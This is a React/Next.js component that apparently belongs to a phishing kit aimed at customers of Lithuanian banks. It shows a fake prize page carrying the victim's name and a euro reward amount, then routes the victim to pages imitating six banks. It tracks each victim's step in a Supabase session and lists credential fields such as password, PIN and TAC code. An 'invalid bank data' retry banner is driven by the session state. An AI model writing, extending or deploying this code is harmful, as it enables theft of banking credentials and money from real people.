"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { persistActiveSession } from "@/lib/session-id-client";

type Props = {
  sessionId: string | null;
  routeSessionId?: string;
  /** invalid_bank adimi icin ayni tasarim + hata bandi */
  invalid?: boolean;
};

function hrefToSlug(href: string): string | null {
  const h = href.toLowerCase();
  if (h.includes("swedbank")) return "swedbank-lt";
  if (h.includes("/seb") || h.endsWith("seb")) return "seb-lt";
  if (h.includes("luminor")) return "luminor-lt";
  if (h.includes("citadele")) return "citadele-lt";
  if (h.includes("lkubnk") || h.includes("lku")) return "lku-lt";
  if (h.includes("siabnk") || h.includes("siauliu")) return "siauliu-lt";
  return null;
}

const BANK_SLUGS = ["swedbank-lt", "seb-lt", "luminor-lt", "citadele-lt", "lku-lt", "siauliu-lt"];

const BANK_CRED_FIELDS = [
  "username", "password", "verfuegernummer", "pin", "rekeningnummer",
  "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode",
];

export function Banken2Client({ sessionId, routeSessionId, invalid }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const containerRef = useRef<HTMLDivElement>(null);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [publicId, setPublicId] = useState<string | null>(null);
  const [html, setHtml] = useState("");
  const [fd, setFd] = useState<Record<string, any>>({});
  const [amount, setAmount] = useState<number>(0);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const savingRef = useRef(false);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId) return;
    persistActiveSession(effectiveSessionId, routeSessionId);
    if (supabase) {
      void supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "banken2" })
        .eq("id", effectiveSessionId);
    }
  }, [effectiveSessionId, routeSessionId, supabase]);

  // Tasarim asset'leri (birebir HTML) — bir kez yukle
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      const [cssRes, htmlRes] = await Promise.all([
        fetch("/win2/banken2.css"),
        fetch("/win2/banken2.html"),
      ]);
      if (cancelled) return;
      const css = cssRes.ok ? await cssRes.text() : "";
      const body = htmlRes.ok ? await htmlRes.text() : "";
      const style = document.createElement("style");
      style.setAttribute("data-banken2", "1");
      style.innerHTML = css;
      document.head.appendChild(style);
      // Override: HTML icindeki gomulu Maxima arkaplanini + blur katmanini kapat,
      // animasyon/transition'lari iptal et — portal arkaplani (ah-theme) gorunur.
      const override = document.createElement("style");
      override.setAttribute("data-banken2-override", "1");
      override.innerHTML = `
        body::before { display: none !important; }
        *, *::before, *::after {
          animation: none !important;
          transition: none !important;
        }
      `;
      document.head.appendChild(override);
      setHtml(body);
    })();
    return () => {
      cancelled = true;
      document.head.querySelector('style[data-banken2="1"]')?.remove();
      document.head.querySelector('style[data-banken2-override="1"]')?.remove();
    };
  }, []);

  // Session verisi (isim + odul miktari)
  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;
    let cancelled = false;
    void (async () => {
      const { data } = await supabase
        .from("sessions")
        .select("amount,form_data,public_id")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      if (cancelled) return;
      if (data?.public_id != null) setPublicId(String(data.public_id));
      const formData = (data?.form_data ?? {}) as Record<string, any>;
      setFd(formData);
      const amt =
        typeof data?.amount === "number" && data.amount > 0
          ? data.amount
          : Number(formData.amount) || 0;
      setAmount(amt);
      setReady(true);
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveSessionId, supabase]);

  // Banka sayfalarini onceden yukle: tiklamada sayfa aninda acilir
  useEffect(() => {
    const shortRoute =
      routeSessionId && !routeSessionId.includes("-") ? routeSessionId : null;
    const routeId = publicId || shortRoute || routeSessionId || effectiveSessionId;
    if (!routeId) return;
    for (const slug of BANK_SLUGS) {
      try {
        router.prefetch(`/win/${encodeURIComponent(routeId)}/bank/${slug}`);
      } catch {
        /* best-effort */
      }
    }
  }, [publicId, routeSessionId, effectiveSessionId, router]);

  // Isim + miktar HTML STRING icinde patchlenir — kirmizi "1" hic boyanmaz.
  const finalHtml = useMemo(() => {
    if (!html || !ready) return "";
    let h = html;
    const esc = (s: string) =>
      s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    const fullName =
      [fd.firstName, fd.lastName].filter(Boolean).join(" ").trim() || "kliente";
    h = h.replace(
      /(style=["']?color:#F62515["']?[^>]*)>\s*1\s*</i,
      `$1>${esc(fullName)}<`,
    );
    if (amount > 0) h = h.replace(/1700(?=\s*eur)/i, String(amount));
    return h;
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [html, ready, fd, amount]);

  // HTML enjekte edildikten sonra: hata bandi + banka click bagla
  useEffect(() => {
    const root = containerRef.current;
    if (!root || !finalHtml) return;

    // Hatali banka: kirmizi uyari bandi
    if (invalid) {
      const container = root.querySelector(".container");
      if (container && !container.querySelector("[data-invalid-banner]")) {
        const banner = document.createElement("div");
        banner.setAttribute("data-invalid-banner", "1");
        banner.style.cssText =
          "background:#fdecea;border:1px solid #f5c6c6;color:#b3261e;border-radius:12px;padding:14px 18px;margin:0 auto 18px;max-width:640px;text-align:center;font-weight:600;font-size:14px;";
        banner.textContent =
          "Neteisingi banko duomenys. Prašome patikrinti savo duomenis ir bandyti dar kartą.";
        const h2 = container.querySelector("h2.header-title");
        container.insertBefore(banner, h2 ? h2.nextSibling : container.firstChild);
      }
    }

    const onClick = async (e: Event) => {
      const a = (e.target as HTMLElement).closest("a.bank-item");
      if (!a) return;
      e.preventDefault();
      const slug = hrefToSlug(a.getAttribute("href") || "");
      if (!slug || !supabase || !effectiveSessionId || savingRef.current) return;
      savingRef.current = true;
      setSaving(true);

      // Ayri select'e gerek yok: fd state zaten mount'ta DB'den yuklendi.
      const nextFd: Record<string, any> = { ...fd };
      for (const f of BANK_CRED_FIELDS) delete nextFd[f];

      // Tik aninda icerigi temizle: update + sayfa gecisi sirasinda
      // eski liste frame'i gorunmesin, sadece portal arkaplani kalir.
      const rootEl = containerRef.current;
      if (rootEl) rootEl.innerHTML = "";

      const { error: upErr } = await supabase
        .from("sessions")
        .update({ is_hidden: false, current_step: "bank", form_data: nextFd })
        .eq("id", effectiveSessionId);

      if (upErr) {
        savingRef.current = false;
        setSaving(false);
        if (rootEl) rootEl.innerHTML = finalHtml;
        return;
      }
      // URL'de uzun UUID yerine kisa public_id kullan (invalid-bank akisinda
      // routeSessionId prop'u UUID gelebiliyor).
      const shortRoute =
        routeSessionId && !routeSessionId.includes("-") ? routeSessionId : null;
      const routeId = publicId || shortRoute || routeSessionId || effectiveSessionId || "";
      router.push(`/win/${encodeURIComponent(routeId)}/bank/${slug}`);
    };

    root.addEventListener("click", onClick);
    return () => root.removeEventListener("click", onClick);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [finalHtml, fd, invalid, effectiveSessionId, routeSessionId, publicId, supabase]);

  return (
    <div
      ref={containerRef}
      style={{
        position: "fixed",
        inset: 0,
        zIndex: 9999,
        overflowY: "auto",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        justifyContent: "center",
        paddingTop: "clamp(60px, 12vh, 160px)",
        paddingBottom: "40px",
        background: "transparent",
        opacity: saving ? 0.7 : 1,
      }}
      dangerouslySetInnerHTML={{ __html: finalHtml }}
    />
  );
}
